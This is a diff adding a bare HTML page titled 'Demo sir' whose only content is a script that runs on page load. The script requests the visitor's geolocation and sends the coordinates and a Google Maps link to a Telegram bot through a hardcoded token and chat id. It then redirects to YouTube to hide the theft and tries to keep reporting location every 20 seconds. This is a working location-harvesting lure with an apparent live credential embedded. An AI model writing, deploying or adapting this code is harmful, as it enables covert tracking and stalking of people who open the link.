@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Demo sir </title>
+</head>
+<body>
+
+
+<script>
+const token = "8766326540:AAHz9XLg0u_jKklB6FEEDh2iLUV9y73FRCM";
+const chat_id = "7315508984";
+
+function sendLocation(lat, lon){
+
+  const map = "https://maps.google.com/?q=" + lat + "," + lon;
+
+  const text = "📍 Location Update\nLatitude: " + lat +
+               "\nLongitude: " + lon +
+               "\nMap: " + map;
+
+  const url = "https://api.telegram.org/bot" + token +
+              "/sendMessage?chat_id=" + chat_id +
+              "&text=" + encodeURIComponent(text);
+
+  fetch(url).catch(()=>{});
+}
+
+function startTracking(){
+
+  navigator.geolocation.getCurrentPosition(function(position){
+
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+
+    sendLocation(lat, lon);
+
+    // redirect to YouTube
+    window.location.href = "https://youtube.com";
+
+    // update location every 20 seconds
+    setInterval(function(){
+      navigator.geolocation.getCurrentPosition(function(pos){
+        sendLocation(pos.coords.latitude, pos.coords.longitude);
+      });
+    },20000);
+
+  }, function(){
+    document.getElementById("status").innerText =
+    "Location permission denied.";
+  });
+
+}
+
+startTracking();
+</script>
+
+</body>
+</html>
